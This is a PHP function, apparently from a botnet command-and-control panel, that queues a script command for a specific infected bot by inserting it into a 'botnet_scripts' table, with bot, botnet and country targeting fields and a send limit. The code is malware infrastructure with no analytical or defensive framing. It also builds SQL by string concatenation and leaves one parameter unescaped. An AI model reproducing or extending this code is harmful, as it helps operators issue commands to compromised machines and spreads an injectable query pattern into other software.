<?php
/** Add a simple Bot Script for a single bot
 * @param string	$botId		Bot ID
 * @param string	$name		Script name
 * @param string	$script		The script command
 * @param string	$send_limit	Send limit
 * @return bool True on success
 */
function add_simple_script($botId, $name, $script, $send_limit = 1, $extern_id = null){
	$q_extern_id = is_null($extern_id)? md5(microtime()) : mysql_escape_string($extern_id);
	$q_botIds = addslashes("\x01".$botId."\x01");
	$q_name = mysql_escape_string($name);
	$q_script = mysql_escape_string($script);
	$values = array(
		'""', # id
		"'$q_extern_id'", # extern_id
		"'$q_name'", # name
		1, # enabled
		time(), # time_created
		$send_limit, # send_limit
		"'$q_botIds'", "''", # bots_wl, bots_bl
		"''", "''", # botnets_wl, botnets_bl
		"''", "''", # countries_wl, countries_bl
		"'$q_script'", # script_text
		"'$q_script'", # script_bin
		);
	return (bool)mysql_query('INSERT INTO `botnet_scripts` VALUES('.implode(',', $values).');');
	}
